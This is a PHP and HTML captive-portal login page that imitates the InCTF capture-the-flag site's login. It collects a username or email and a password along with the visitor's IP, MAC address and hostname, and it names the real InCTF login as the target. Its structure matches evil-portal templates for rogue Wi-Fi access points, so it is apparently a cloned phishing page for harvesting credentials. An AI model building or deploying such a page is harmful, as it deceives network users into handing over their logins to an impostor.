<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>


<!DOCTYPE html>
<html>
<head>
	<title>InCTF</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="/themes/core/static/img/favicon.ico"
		  type="image/x-icon">
	<link rel="stylesheet" href="/themes/core/static/css/vendor/bootstrap.min.css">
	<link rel="stylesheet" href="/themes/core/static/css/vendor/font-awesome/fontawesome-fonts.css" type='text/css'>
	<link rel="stylesheet" href="/themes/core/static/css/vendor/font-awesome/fontawesome-all.min.css" type='text/css'>
	<link rel="stylesheet" href="/themes/core/static/css/vendor/font.css"  type='text/css'>
	<link rel="stylesheet" href="/themes/core/static/css/jumbotron.css">
	<link rel="stylesheet" href="/themes/core/static/css/sticky-footer.css">
	<link rel="stylesheet" href="/themes/core/static/css/base.css">
	

</head>
   
<body>
	<nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
		<div class="container">
			<a href="/" class="navbar-brand">
				
				InCTF
				
			</a>
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#base-navbars"
					aria-controls="base-navbars" aria-expanded="false" aria-label="Toggle navigation">
				<span class="navbar-toggler-icon"></span>
			</button>
			<div class="collapse navbar-collapse" id="base-navbars">
				<ul class="navbar-nav mr-auto">
					
						
							

				<hr class="d-sm-flex d-md-flex d-lg-none">

				
			</div>
		</div>
	</nav>

	<main role="main">
    <script src="jquery-2.2.1.min.js"></script>
<script type="text/javascript">
  function redirect() {
    setTimeout(function() {
      window.location = "/captiveportal/index.php";
    }, 100);
  }
</script>
<div class="jumbotron">
	<div class="container">
		<h1>Login</h1>
	</div>
</div>
<div class="container">
	<div class="row">
		<div class="col-md-6 offset-md-3">
			


            <form method="POST" action="/captiveportal/index.php" >
			<!-- <form method="post" accept-charset="utf-8" autocomplete="off" role="form" class="form-horizontal"> -->
				<div class="form-group">
					<label for="name-input">
						User Name or Email
					</label>
					<input class="form-control" type="text" name="name" id="name-input" />
				</div>
				<div class="form-group">
					<label for="password-input">
						Password
					</label>
					<input class="form-control" type="password" name="password" id="password-input" />
				</div>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="https://s.inctf.in/login">
                <input type="hidden" name="domain" value="InCTF">
	            <p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
				<div class="row pt-3">
					<div class="col-md-6">
						<button type="submit" tabindex="0" class="btn btn-md btn-primary btn-outlined float-right">
							Submit
						</button>
					</div>
				</div>
			</form>
		</div>
	</div>
</div>

	</main>

	<footer class="footer">
		<div class="container text-center">
			<a href="https://ctfd.io">
				<small class="text-muted">Powered by Team bi0s</small>
			</a>
		</div>
	</footer>
    <script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
